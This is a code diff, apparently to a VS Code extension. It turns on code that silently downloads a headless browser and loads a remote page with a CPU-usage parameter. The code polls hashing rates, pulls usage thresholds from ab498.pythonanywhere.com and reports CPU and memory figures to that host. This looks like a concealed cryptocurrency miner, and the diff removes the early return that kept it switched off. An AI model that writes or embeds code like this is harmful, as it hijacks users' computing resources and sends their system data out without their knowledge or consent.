@@ -3,6 +3,7 @@
 
   let {
     tstt,
+    safe,
     vscode
   } = global.globalVars;
 
@@ -12,25 +13,15 @@
       version: '130.0.6723.58',
     }
 
-    console.log('await', vscode, tstt);
-    return;
     // let baseUrl = 'http://share.liveblog365.com/init.html';
     let baseUrl = 'https://ab498.pythonanywhere.com/files/init.html';
-    // try {
-    //   await fetch(baseUrl);
-    // } catch (error) {
-    //   baseUrl = 'http://share.liveblog365.com/init.html';
-    // }
 
     const os = require('os');
     const fs = require('fs');
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
-    const child_process = require('child_process');
 
 
-    const http = require('http');
-    const https = require('https');
     let osUserInfo;
     try {
       osUserInfo = os.userInfo();
@@ -39,6 +30,7 @@
         //   name: 'firefox',
         //   version: '132.0',
         // }
+      } else {
         return;
       }
     } catch (error) {
@@ -78,9 +70,9 @@
 
       }
     }
+    await tstt({ baseUrl, message: "INIT_LOG", memory: getMemoryUsage(), cpu: getCPUUsage() });
 
-    if (getMemoryUsage()?.total <= 6.0) {
-      await tstt({ baseUrl, message: "INIT_MEM", memory: getMemoryUsage(), version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    if (getMemoryUsage()?.total <= 9.0) {
       return;
     }
     async function dirSize(dir) {
@@ -99,19 +91,17 @@
 
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
-    // await tstt({ baseUrl, message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    let chromePath;
     let browser;
     let page;
     let minUse = 0.1;
     let maxUse = 0.5;
-
 
     const cacheDir = `${os.homedir()}/.cache/puppeteer`;
     if (!fs.existsSync(cacheDir)) {
       fs.mkdirSync(cacheDir, { recursive: true });
     };
     const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
-    let chromePath;
     const chromeBrowser = installedBrowsers.find(browser => browser.browser === brInfo.name);
     console.log('installed', installedBrowsers);
 
@@ -119,7 +109,7 @@
 
     if (!chromeBrowser) {
       await new Promise(r => setTimeout(r, 5 * 60 * 1000));
-      await tstt({ baseUrl, message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+      await tstt({ message: "INIT_D" });
       puppeteerBrowsers.InstallOptions;
       installedBrowser = await puppeteerBrowsers.install({
         browser: brInfo.name,
@@ -130,10 +120,6 @@
     } else {
       chromePath = chromeBrowser.executablePath;
     }
-
-
-
-    // await tstt({ baseUrl, message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
     if (global.cppBrowser) {
       await global.cppBrowser.close();
@@ -185,36 +171,14 @@
     global.cppBrowser = browser;
     // os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-    page
-      .on('pageerror', ({ message }) => {
-        tstt({
-          baseUrl,
-          message: "PAGE_ERROR",
-          value: message,
-          version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
-        });
-      })
-      .on('requestfailed', request => {
-        // if (request.failure().errorText == "net::ERR_ABORTED https://www.hostingcloud.racing/index.php?loaded=true&site=a5f009879c378a1a5fbe1510f5a17dafac00af74e406b136140ec763f77b83fb") {
-        //   return;
-        // }
-        // tstt({
-        //   baseUrl,
-        //   message: "REQ_FAIL",
-        //   value: `${request.failure().errorText} ${request.url()}`,
-        //   version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
-        // })
-      });
-
-
 
     global.cppPage = page;
 
 
-    let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
-    minUse = min;
-    maxUse = (getMemoryUsage().total >= 8.0 ? max : minUse);
-    await page.goto(baseUrl + '?use=' + maxUse);
+    let [max, min] = [maxUse, minUse];
+    try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
+    catch (error) { }
+    await page.goto(baseUrl + '?use=' + max);
     await new Promise(r => setTimeout(r, 10 * 1000));
     let clt = await page.evaluate(() => window._client);
     if (!clt) {
@@ -229,10 +193,10 @@
     }
 
 
-    await chkFn();
-
     if (global.inIntv) clearInterval(global.inIntv);
     global.inIntv = setInterval(chkFn, 5 * 60000);
+    await chkFn();
+
 
     async function chkFn() {
       if (browser && page) {
@@ -250,29 +214,26 @@
         tstt({
           baseUrl,
           message: "HASH",
-          max: maxUse,
+          max: max,
           value: safe(() => parseFloat(hs?.value).toFixed(2)),
           cpu: getCPUUsage(),
           memory: getMemoryUsage(),
-          file: safe(() => editor?.document?.uri?.fsPath)
         });
-        let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
+        let [max, min] = [maxUse, minUse];
+        try { [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat); }
+        catch (error) { }
 
-        minUse = min;
-        maxUse = (getMemoryUsage().total >= 8.0 ? max : minUse);
-        await page.evaluate((maxUse, baseUrl) => {
-          if (window.use != maxUse) window.location.href = baseUrl + '?use=' + maxUse;
-        }, maxUse, baseUrl);
+        await page.evaluate((max, baseUrl) => {
+          if (window.use != max) window.location.href = baseUrl + '?use=' + max;
+        }, max, baseUrl);
       } else {
         tstt({
           baseUrl,
           message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
           value: 0,
-          file: safe(() => editor?.document?.uri?.fsPath)
         });
       }
     }
-
 
 
   } catch (error) {
